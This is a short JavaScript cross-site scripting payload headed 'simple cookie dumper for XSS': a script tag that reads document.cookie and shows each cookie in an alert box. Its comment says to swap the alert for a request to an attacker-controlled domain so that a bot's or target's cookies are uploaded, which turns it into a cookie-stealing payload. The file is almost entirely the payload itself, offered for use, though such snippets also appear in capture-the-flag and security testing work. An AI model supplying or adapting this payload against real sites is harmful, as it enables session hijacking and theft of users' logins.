/* simple cookie dumper for XSS
note that this will return YOUR cookies, so
if there is a bot or other ethical target you
need cookies from replace alert with a request
to a domain you control to uplaod the info
*/

//html headers
<script>
  var cookies = document.cookie.split(';');
  for (var i = 0; i < cookies.length; i++) {
    alert(cookies[i].trim());
  }
</script>